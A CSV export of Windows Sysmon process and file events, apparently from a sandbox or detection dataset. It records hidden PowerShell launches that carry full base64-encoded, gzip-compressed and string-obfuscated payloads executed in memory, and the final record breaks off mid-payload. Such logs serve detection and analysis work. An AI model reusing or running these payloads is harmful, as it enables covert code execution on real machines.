"Process Create:
RuleName: -
UtcTime: 2025-02-07 08:14:09.060
ProcessGuid: {425f3eb2-c0d1-67a5-190e-000000000d00}
ProcessId: 2248
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAM/ApWcCA7VWbW/aSBD+Xqn/wa{1}s2dY5YF4ul0SqdGvAgQQTEt4CFJ029mI2rL1gLwHU63+/WYMDvZK79EMtIez1zOzsM8884+kq8gTlkULOla8fPyj7q41jHCq6GhRMRX2e4kFgHF6qpLecKp8VfYwWiy{1}PMY0mV1eVVRyTSOyec9dE{1}CQh4ROjJNEN5W9lMC'+'MxObt7eiaeUL4q6l+5a8afMNubbSvYmxHlDEW+fNfkHpZ55T{1}LR{1}WuffmiGeOzwiRXW64wS3Sts00ECXM+Y5qhfD'+'Pkht3tguiaS72Y'+'J3wqcgMalYq5XpTgKWlBtBfiEjHjfqLBYQ7HiYlYxdHuVDLMzkjX4LYdcw/5fkySRDOVsdxgPJn8qY/3uz+sIkFDkmtEgsR80SHxC/VIkqvjyGfkgUwn4NURMY2CiWGA2QufE12NV{1}yZys+E0VtknWH3Xif92Ams2iI2TKjpiXO63F8xsvPUTiQKPDDgeuUC4PdNQjjN2MNr6PYEfw4L2TVO3xBIWW/zhKbOnxXLVFzYHAseb+FR'+'7cYrYkxeAVfU7cJ8b6xC5ghuOCjAyrjPqT85+H9XfZVe3FS{1}tHqbzFUypRGpbiMcUi/jq36qJmTKSIpILjNrQYa6tn9B/C'+'phJMBC{1}iyp8YNbLaTi1dde'+'UeaTGHlQ1wSygpIb3yezK5yu'+'NSKXhADe7hm4qk6hS0hmve+Mbba7fAYjrcJwkphKewVt6plKh2BGfFNBUUL3r9BK8PRWO6TrrpigHk5EFm5i/BvP/b4VHiU'+'iXnlQV8Cg21kQj2ImITGVOvWJve3QINtfOwlIBTMG7QORXqAgsCKB6AjJlhhSBWYYuQ4Rj'+'XDBSAgWqW{1}4DAegEfsWS'+'cmFA'+'+Jrb+WZtcKO9xKZDJKjLKHcHcaFqfRpLECEJM{1}4FcifzeFH7dklU4nJvjh61mFjeytkC6jru99fJEv3CKV4xAKwcGIe2jgh5+Wd0Oif8ne0jeAaNiLm+jdzWmis4efCr+dOf2t6NGgLi4euV0na184F{1}utg7V20kOff'+'+OSyA3b31GpcIN9+pJZdnnm'+'21UV1WAuGvYYYNlC9O/OY1a6FzVYj2eTX9YGMtYvhlcv1RwuVSuW7kjUH9Ia0EMyR3wrpetOEe1DUu6bdSGyrwW{1}3lYenQdEZDVg9X3Zm0wFPOufDaj6fv/Rx1d0iZHO/5G4fCw+8W/dCuxzx/GWlPEc1hCpRre/Y/HZ{1}x6id7+Ngwde3z/OgGFSQ7XiUjO57jn1/79i{1}d/28rF7mg/zl4BHP7EG/SEeLx4cZPDvr+r2bt8{1}Nn2z4RXNA+y8ylr20ndEjRs3R1snnC8OkiOc2RzYA64yW6H{1}2XDhtBv7dXpGjPmsdbO/r1'+'VtvVPgjcT9/gkKOezQSpeJExb3El2r38YO6WR4V8y0pd3GczDCDI{1}NGZ83m8NjZy26bU+mh6zC85ySOCIN5BxMxYyhi'+'jHtS81N5hnmzmwJyKPUaaUqn7gzl1dA4zIJs6epqBDkC6SUhc0'+'0SBWJmWpuSZYGIWxurnPL7/Ser8MVWT4OZcgwAMFlslsaG'+'cHSq6PqvxgpGvQDJeRutt4CDnecgESBZu8aV8Nmcs2Pw0lO90uAYOYCsAMceyy'+'Gf8gP8z8hSUYUcgccjVY02D0+/kjR79ZnBn/9/pDms/cfbdxHJMiU4Pyx+v3Ck27/s+ANMBdh1QEIZ2Y310yjsu+T4MwkqAz0w3V/ya/duJc5a8PWUyvg/ffZ1vWULAAA{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-F21NMCI\admin
LogonGuid: {425f3eb2-d380-67a4-4938-020000000000}
LogonId: 0x23849
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=BCC5A6493E0641AA1E60CBF69469E579,SHA256=7762A4766BC394B4CB2D658144B207183FF23B3139181CD74E615DB63E6E57D6,IMPHASH=C6A0924236A2CDF364F3D2FAD87F702A
ParentProcessGuid: {425f3eb2-c0cf-67a5-170e-000000000d00}
ParentProcessId: 5788
ParentImage: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQAvAEEAcABXAGMAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBYAHEAbgAvAHcAYQB7ADEAfQBzADIAZABZADUAWQBGADQAdQBsADAAUwBxAGQARwB2AEEAZwBRAFEAVABFAHQANABDAEYASgAwADIAOQBtAEkAMgByAEwAMQBnAEwAdwBIAFUANgAzACsALwBXAFkATQBEAHYAWgBLADcAOQBFAE0AdABJAGUAegAxAHoATwB6AHMATQA4ADgAOAA0ACsAawBxADgAZwBUAGwAawBVAEwATwBsAGEAOABmAFAAeQBqADcAcQA0ADEAagBIAEMAcQA2AEcAaABSAE0AUgBYADIAZQA0AGsARgBnAEgARgA2AHEAcABMAGUAYwBLAHAAOABWAGYAWQB3AFcAaQB5AHsAMQB9AFAATQBZADAAbQBWADEAZQBWAFYAUgB5AFQAUwBPAHkAZQBjADkAZABFAHsAMQB9AEMAUQBoADQAUgBPAGoASgBOAEUATgA1AFcAOQBsAE0AQwAnACcAKwAnACcATQB4AE8AYgB0ADcAZQBpAGEAZQBVAEwANABxADYAbAArADUAYQA4AGEAZgBNAE4AdQBiAGIAUwB2AFkAbQB4AEgAbABEAEUAVwArAGYATgBmAGsASABwAFoANQA1AFQAewAxAH0ATABSAHsAMQB9AFcAdQBmAGYAbQBpAEcAZQBPAHoAdwBpAFIAWABXADYANAB3AFMAMwBTAHQAcwAwADAARQBDAFgATQArAFkANQBxAGgAZgBEACcAJwArACcAJwBQAGsAaAB0ADMAdABnAHUAaQBhAFMANwAyAFkAJwAnACsAJwAnAEoAMwB3AHEAYwBnAE0AYQBsAFkAcQA1AFgAcABUAGcASwBXAGwAQgB0AEIAZgBpAEUAagBIAGoAZgBxAEwAQgBZAFEANwBIAGkAWQBsAFkAeABkAEgAdQBWAEQATABNAHoAawBqAFgANABMAFkAZABjAHcALwA1AGYAawB5AFMAUgBEAE8AVgBzAGQAeABnAFAASgBuADgAcQBZAC8AMwB1AHoAKwBzAEkAawBGAEQAawBtAHQARQBnAHMAUgA4ADAAUwBIAHgAQwAvAFYASQBrAHEAdgBqAHkARwBmAGsAZwBVAHcAbgA0AE4AVQBSAE0AWQAyAEMAaQBXAEcAQQAyAFEAdQBmAEUAMQAyAE4AVgB7ADEAfQB5AFoAeQBzACsARQAwAFYAdABrAG4AVwBIADMAWABpAGYAOQAyAEEAbQBzADIAaQBJADIAVABLAGoAcABpAFgATwA2ADMARgA4AHgAcwB2AFAAVQBUAGkAUQBLAFAARABEAGcAZQB1AFUAQwA0AFAAZABOAFEAagBqAE4AMgBNAE4AcgA2AFAAWQBFAGYAdwA0AEwAMgBUAFYATwAzAHgAQgBJAFcAVwAvAHoAaABLAGIATwBuAHgAWABMAFYARgB6AFkASABBAHMAZQBiACsARgBSACcAJwArACcAJwA3AGMAWQByAFkAawB4AGUAQQBWAGYAVQA3AGMASgA4AGIANgB4AEMANQBnAGgAdQBPAEMAagBBAHkAcgBqAFAAcQBUADgANQArAEgAOQBYAGYAWgBWAGUAMwBGAFMAewAxAH0AdABIAHEAYgB6AEYAVQB5AHAAUgBHAHAAYgBpAE0AYwBVAGkALwBqAHEAMwA2AHEASgBtAFQASwBTAEkAcABJAEwAagBOAHIAUQBZAGEANgB0AG4AOQBCAC8AQwAnACcAKwAnACcAcABoAEoATQBCAEMAewAxAH0AaQB5AHAAOABZAE4AYgBMAGEAVABpADEAZABkAGUAJwAnACsAJwAnAFUAZQBhAFQARwBIAGwAUQAxAHcAUwB5AGcAcABJAGIAMwB5AGUAegBLADUAeQB1ACcAJwArACcAJwBOAFMASwBYAGgAQQBEAGUANwBoAG0ANABxAGsANgBoAFMAMABoAG0AdgBlACsATQBiAGIAYQA3AGYAQQBZAGoAcgBjAEoAdwBrAHAAaABLAGUAdwBWAHQANgBwAGwASwBoADIAQgBHAGYARgBOAEIAVQBVAEwAMwByADkAQgBLADgAUABSAFcATwA2AFQAcgByAHAAaQBnAEgAawA1AEUARgBtADUAaQAvAEIAdgBQAC8AYgA0AFYASABpAFUAJwAnACsAJwAnAGkAWABuAGwAUQBWADgAQwBnADIAMQBrAFEAagAyAEkAbQBJAFQARwBWAE8AdgBXAEoAdgBlADMAUQBJAE4AdABmAE8AdwBsAEkAQgBUAE0ARwA3AFEATwBSAFgAcQBBAGcAcwBDAEsAQgA2AEEAagBKAGwAaABoAFMAQgBXAFkAWQB1AFEANABSAGoAJwAnACsAJwAnAFgARABCAFMAQQBnAFcAcQBXAHsAMQB9ADQARABBAGUAZwBFAGYAcwBXAFMAJwAnACsAJwAnAGMAbQBGAEEAJwAnACsAJwAnACsASgByAGIAKwBXAFoAdABjAEsATwA5AHgASwBaAEQASgBLAGoATABLAEgAYwBIAGMAYQBGAHEAZgBSAHAATABFAEMARQBKAE0AewAxAH0ANABGAGMAaQBmAHoAZQBGAEgANwBkAGsAbABVADQAbgBKAHYAagBoADYAMQBtAEYAagBlAHkAdABrAEMANgBqAHIAdQA5ADkAZgBKAEUAdgAzAEMASwBWADQAeABBAEsAdwBjAEcASQBlADIAagBnAGgANQArAFcAZAAwAE8AaQBmADgAbgBlADAAagBlAEEAYQBOAGkATABtACsAagBkAHoAVwBtAGkAcwA0AGUAZgBDAHIAKwBkAE8AZgAyAHQANgBOAEcAZwBMAGkANABlAHUAVgAwAG4AYQAxADgANABGAHsAMQB9AHUAdABnADcAVgAyADAAawBPAGYAZgAnACcAKwAnACcAKwBPAFMAeQBBADMAYgAzADEARwBwAGMASQBOADkAKwBwAEoAWgBkAG4AbgBtACcAJwArACcAJwAyADEAVQBWADEAVwBBAHUARwB2AFkAWQBZAE4AbABDADkATwAvAE8AWQAxAGEANgBGAHoAVgBZAGoAMgBlAFQAWAA5AFkARwBNAHQAWQB2AGgAbABjAHYAMQBSAHcAdQBWAFMAdQBXADcAawBqAFUASAA5AEkAYQAwAEUATQB5AFIAMwB3AHIAcABlAHQATwBFAGUAMQBEAFUAdQA2AGIAZABTAEcAeQByAHcAVwB7ADEAfQAzAGwAWQBlAG4AUQBkAEUAWgBEAFYAZwA5AFgAMwBaAG0AMAB3AEYAUABPAHUAZgBEAGEAagA2AGYAdgAvAFIAeAAxAGQAMABpAFoASABPAC8ANQBHADQAZgBDAHcAKwA4AFcALwBkAEMAdQB4AHoAeAAvAEcAVwBsAFAARQBjADEAaABDAHAAUgByAGUALwBZAC8ASABaAHsAMQB9AHgANgBpAGQANwArAE4AZwB3AGQAZQAzAHoALwBPAGcARwBGAFMAUQA3AFgAaQBVAGoATwA1ADcAagBuADEALwA3ADkAaQB7ADEAfQBkAC8AMgA4AHIARgA3AG0AZwAvAHoAbAA0AEIASABQADcARQBHAC8AUwBFAGUATAB4ADQAYwBaAFAARAB2AHIAKwByADIAYgB0ADgAewAxAH0ATgBuADIAegA0AFIAWABOAEEAKwB5ADgAeQBsAHIAMgAwAG4AZABFAGoAUgBzADMAUgAxAHMAbgBuAEMAOABPAGsAaQBPAGMAMgBSAHoAWQBBADYANAB5AFcANgBIAHsAMQB9ADIAWABEAGgAdABCAHYANwBkAFgAcABHAGoAUABtAHMAZABiAE8ALwByADEAJwAnACsAJwAnAFYAdAB2AFYAUABnAGoAYwBUADkALwBnAGsASwBPAGUAegBRAFMAcABlAEoARQB4AGIAMwBFAGwAMgByADMAOABZAE8ANgBXAFIANABWADgAeQAwAHAAZAAzAEcAYwB6AEQAQwBEAEkAewAxAH0ATgBHAFoAOAAzAG0AOABOAGoAWgB5ADIANgBiAFUAKwBtAGgANgB6AEMAOAA1AHkAUwBPAEMASQBOADUAQgB4AE0AeABZAHkAaABpACcAJwArACcAJwBqAEgAdABTADgAMQBOADUAaABuAG0AegBtAHcASgB5AEsAUABVAGEAYQBVAHEAbgA3AGcAegBsADEAZABBADQAegBJAEoAcwA2AGUAcABxAEIARABrAEMANgBTAFUAaABjADAAJwAnACsAJwAnADAAUwBCAFcASgBtAFcAcAB1AFMAWgBZAEcASQBXAHgAdQByAG4AUABMADcALwBTAGUAcgA4AE0AVgBXAFQANABPAFoAYwBnAHcAQQBNAEYAbABzAGwAcwBhAEcAJwAnACsAJwAnAGMASABTAHEANgBQAHEAdgB4AGcAcABHAHYAUQBEAEoAZQBSAHUAdAB0ADQAQwBEAG4AZQBjAGcARQBTAEIAWgB1ADgAYQBWADgATgBtAGMAcwAyAFAAdwAwAGwATwA5ADAAdQBBAFkATwBZAEMAcwBBAE0AYwBlAHkAeQAnACcAKwAnACcARwBmADgAZwBQADgAegA4AGgAUwBVAFkAVQBjAGcAYwBjAGoAVgBZADAAMgBEADAAKwAvAGsAagBSADcAOQBaAG4AQgBuAC8AOQAvAHAARABtAHMALwBjAGYAYgBkAHgASABKAE0AaQBVADQAUAB5AHgAKwB2ADMAQwBrADIANwAvAHMAKwBBAE4ATQBCAGQAaAAxAFEARQBJAFoAMgBZADMAMQAwAHkAagBzAHUAKwBUADQATQB3AGsAcQBBAHoAMAB3ADMAVgAvAHkAYQAvAGQAdQBKAGMANQBhADgAUABXAFUAeQB2AGcALwBmAGYAWgAxAHYAVwBVAEwAQQBBAEEAewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBvACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
ParentUser: DESKTOP-F21NMCI\admin","1","5",,"4","1","0","-9223372036854775808","13749","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:09 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","Process Create (rule: ProcessCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"File created:
RuleName: -
UtcTime: 2025-02-07 08:14:08.156
ProcessGuid: {425f3eb2-c0cf-67a5-170e-000000000d00}
ProcessId: 5788
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\admin\AppData\Local\Temp\__PSScriptPolicyTest_h5s13y4m.fc2.ps1
CreationUtcTime: 2025-02-07 08:14:08.156
User: DESKTOP-F21NMCI\admin","11","2",,"4","11","0","-9223372036854775808","13748","Microsoft-Windows-Sysmon","5770385f-c22a-43e0-bf4c-06f5698ffbd9","Microsoft-Windows-Sysmon/Operational","2996","4896","DESKTOP-F21NMCI","S-1-5-18","2/7/2025 3:14:08 PM",,,"Microsoft-Windows-Sysmon/Operational","System.UInt32[]","System.Diagnostics.Eventing.Reader.EventBookmark","Information","Info","File created (rule: FileCreate)","System.Collections.ObjectModel.ReadOnlyCollection`1[System.String]","System.Collections.Generic.List`1[System.Diagnostics.Eventing.Reader.EventProperty]"
"Process Create:
RuleName: -
UtcTime: 2025-02-07 08:14:07.859
ProcessGuid: {425f3eb2-c0cf-67a5-170e-000000000d00}
ProcessId: 5788
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQAvAEEAcABXAGMAQwBBADcAVgBXAGIAVwAvAGEAUwBCAEQAKwBYAHEAbgAvAHcAYQB7ADEAfQBzADIAZABZADUAWQBGADQAdQBsADAAUwBxAGQARwB2AEEAZwBRAFEAVABFAHQANABDAEYASgAwADIAOQBtAEkAMgByAEwAMQBnAEwAdwBIAFUANgAzACsALwBXAFkATQBEAHYAWgBLADcAOQBFAE0AdABJAGUAegAxAHoATwB6AHMATQA4ADgAOAA0ACsAawBxADgAZwBUAGwAawBVAEwATwBsAGEAOABmAFAAeQBqADcAcQA0ADEAagBIAEMAcQA2AEcAaABSAE0AUgBYADIAZQA0AGsARgBnAEgARgA2AHEAcABMAGUAYwBLAHAAOABWAGYAWQB3AFcAaQB5AHsAMQB9AFAATQBZADAAbQBWADEAZQBWAFYAUgB5AFQAUwBPAHkAZQBjADkAZABFAHsAMQB9AEMAUQBoADQAUgBPAGoASgBOAEUATgA1AFcAOQBsAE0AQwAnACcAKwAnACcATQB4AE8AYgB0ADcAZQBpAGEAZQBVAEwANABxADYAbAArADUAYQA4AGEAZgBNAE4AdQBiAGIAUwB2AFkAbQB4AEgAbABEAEUAVwArAGYATgBmAGsASABwAFoANQA1AFQAewAxAH0ATABSAHsAMQB9AFcAdQBmAGYAbQBpAEcAZQBPAHoAdwBpAFIAWABXADYANAB3AFMAMwBTAHQAcwAwADAARQBDAFgATQArAFkANQBxAGgAZgBEACcAJwArACcAJwBQAGsAaAB0ADMAdABnAHUAaQBhAFMANwAyAFkAJwAnACsAJwAnAEoAMwB3AHEAYwBnAE0AYQBsAFkAcQA1AFgAcABUAGcASwBXAGwAQgB0AEIAZgBpAEUAagBIAGoAZgBxAEwAQgBZAFEANwBIAGkAWQBsAFkAeABkAEgAdQBWAEQATABNAHoAawBqAFgANABMAFkAZABjAHcALwA1AGYAawB5AFMAUgBEAE8AVgBzAGQAeABnAFAASgBuADgAcQBZAC8AMwB1AHoAKwBzAEkAawBGAEQAawBtAHQARQBnAHMAUgA4ADAAUwBIAHgAQwAvAFYASQBrAHEAdgBqAHkARwBmAGsAZwBVAHcAbgA0AE4AVQBSAE0AWQAyAEMAaQBXAEcAQQAyAFEAdQBmAEUAMQAyAE4AVgB7ADEAfQB5AFoAeQBzACsARQAwAFYAdABrAG4AVwBIADMAWABpAGYAOQAyAEEAbQBzADIAaQBJADIAVABLAGoAcABpAFgATwA2ADMARgA4AHgAcwB2AFAAVQBUAGkAUQBLAFAARABEAGcAZQB1AFUAQwA0AFAAZABOAFEAagBqAE4AMgBNAE4AcgA2AFAAWQBFAGYAdwA0AEwAMgBUAFYATwAzAHgAQgBJAFcAVwAvAHoAaABLAGIATwBuAHgAWABMAFYARgB6AFkASABBAHMAZQBiACsARgBSACcAJwArACcAJwA3AGMAWQByAFkAawB4AGUAQQBWAGYAVQA3AGMASgA4AGIANgB4AEMANQBnAGgAdQBPAEMAagBBAHkAcgBqAFAAcQBUADgANQArAEgAOQBYAGYAWgBWAGUAMwBGAFMAewAxAH0AdABIAHEAYgB6AEYAVQB5AHAAUgBHAHAAYgBpAE0AYwBVAGkALwBqAHEAMwA2AHEASgBtAFQASwBTAEkAcABJAEwAagBOAHIAUQBZAGEANgB0AG4AOQBCAC8AQwAnACcAKwAnACcAcABoAEoATQBCAEMAewAxAH0AaQB5AHAAOABZAE4AYgBMAGEAVABpADEAZABkAGUAJwAnACsAJwAnAFUAZQBhAFQARwBIAGwAUQAxAHcAUwB5AGcAcABJAGIAMwB5AGUAegBLADUAeQB1ACcAJwArACcAJwBOAFMASwBYAGgAQQBEAGUANwBoAG0ANABxAGsANgBoAFMAMABoAG0AdgBlACsATQBiAGIAYQA3AGYAQQBZAGoAcgBjAEoAdwBrAHAAaABLAGUAdwBWAHQANgBwAGwASwBoADIAQgBHAGYARgBOAEIAVQBVAEwAMwByADkAQgBLADgAUABSAFcATwA2AFQAcgByAHAAaQBnAEgAawA1AEUARgBtADUAaQAvAEIAdgBQAC8AYgA0AFYASABpAFUAJwAnACsAJwAnAGkAWABuAGwAUQBWADgAQwBnADIAMQBrAFEAagAyAEkAbQBJAFQARwBWAE8AdgBXAEoAdgBlADMAUQBJAE4AdABmAE8AdwBsAEkAQgBUAE0ARwA3AFEATwBSAFgAcQBBAGcAcwBDAEsAQgA2AEEAagBKAGwAaABoAFMAQgBXAFkAWQB1AFEANABSAGoAJwAnACsAJwAnAFgARABCAFMAQQBnAFcAcQBXAHsAMQB9ADQARABBAGUAZwBFAGYAcwBXAFMAJwAnACsAJwAnAGMAbQBGAEEAJwAnACsAJwAnACsASgByAGIAKwBXAFoAdABjAEsATwA5AHgASwBaAEQASgBLAGoATABLAEgAYwBIAGMAYQBGAHEAZgBSAHAATABFAEMARQBKAE0AewAxAH0ANABGAGMAaQBmAHoAZQBGAEgANwBkAGsAbABVADQAbgBKAHYAagBoADYAMQBtAEYAagBlAHkAdABrAEMANgBqAHIAdQA5ADkAZgBKAEUAdgAzAEMASwBWADQAeABBAEsAdwBjAEcASQBlADIAagBnAGgANQArAFcAZAAwAE8AaQBmADgAbgBlADAAagBlAEEAYQBOAGkATABtACsAagBkAHoAVwBtAGkAcwA0AGUAZgBDAHIAKwBkAE8AZgAyAHQANgBOAEcAZwBMAGkANABlAHUAVgAwAG4AYQAxADgANABGAHsAMQB9AHUAdABnADcAVgAyADAAawBPAGYAZgAnACcAKwAnACcAKwBPAFMAeQBBADMAYgAzADEARwBwAGMASQBOADkAKwBwAEoAWgBkAG4AbgBtACcAJwArACcAJwAyADEAVQBWADEAVwBBAHUARwB2AFkAWQBZAE4AbABDADkATwAvAE8AWQAxAGEANgBGAHoAVgBZAGoAMgBlAFQAWAA5AFkARwBNAHQAWQB2AGgAbABjAHYAMQBSAHcAdQBWAFMAdQBXADcAawBqAFUASAA5AEkAYQAwAEUATQB5AFIAMwB3AHIAcABlAHQATwBFAGUAMQBEAFUAdQA2AGIAZABTAEcAeQByAHcAVwB7ADEAfQAzAGwAWQBlAG4AUQBkAEUAWgBEAFYAZwA5AFgAMwBaAG0AMAB3AEYAUABPAHUAZgBEAGEAagA2AGYAdgAvAFIAeAAxAGQAMABpAFoASABPAC8ANQBHADQAZgBDAHcAKwA4AFcALwBkAEMAdQB4AHoAeAAvAEcAVwBsAFAARQBjADEAaABDAHAAUgByAGUALwBZAC8ASABaAHsAMQB9AHgANgBpAGQANwArAE4AZwB3AGQAZQAzAHoALwBPAGcARwBGAFMAUQA3AFgAaQBVAGoATwA1ADcAagBuADEALwA3ADkAaQB7ADEAfQBkAC8AMgA4AHIARgA3AG0AZwAvAHoAbAA0AEIASABQADcARQBHAC8AUwBFAGUATAB4ADQAYwBaAFAARAB2AHIAKwByADIAYgB0ADgAewAxAH0ATgBuADIAegA0AFIAWABOAEEAKwB5ADgAeQBsAHIAMgAwAG4AZABFAGoAUgBzADMAUgAxAHMAbgBuAEMAOABPAGsAaQBPAGMAMgBSAHoAWQBBADYANAB5AFcANgBIAHsAMQB9ADIAWABEAGgAdABCAHYANwBkAFgAcABHAGoAUABtAHMAZABiAE8ALwByADEAJwAnACsAJwAnAFYAdAB2AFYAUABnAGoAYwBUADkALwBnAGsASwBPAGUAegBRAFMAcABlAEoARQB4AGIAMwBFAGwAMgByADMAOABZAE8ANgBXAFIANABWADgAeQAwAHAAZAAzAEcAYwB6AEQAQwBEAEkAewAxAH0ATgBHAFoAOAAzAG0AOABOAGoAWgB5ADIANgBiAFUAKwBtAGgANgB6AEMAOAA1AHkAUwBPAEMASQBOADUAQgB4AE0AeABZAHkAaABpACcAJwArACcAJwBqAEgAdABTADgAMQBOADUAaABuAG0AegBtAHcASgB5AEsAUABVAGEAYQBVAHEAbgA3AGcAegBsADEAZABBADQAegBJAEoAcwA2AGUAcABxAEIARABrAEMANgBTAFUAaABjADAAJwAnACsAJwAnADAAUwBCAFcASgBtAFcAcAB1AFMAWgBZAEcASQBXAHgAdQByAG4AUABMADcALwBTAGUAcgA4AE0AVgBXAFQANABPAFoAYwBnAHcAQQBNAEYAbABzAGwAcwBhAEcAJwAnACsAJwAnAGMASABTAHEANgBQAHEAdgB4AGcAcABHAHYAUQBEAEoAZQBSAHUAdAB0ADQAQwBEAG4AZQBjAGcARQBTAEIAWgB1ADgAYQBWADgATgBtAGMAcwAyAFAAdwAwAGwATwA5ADAAdQBBAFkATwBZAEMAcwBBAE0AYwBlAHkAeQAnACcAKwAnACcARwBmADgAZwBQADgAegA4AGgA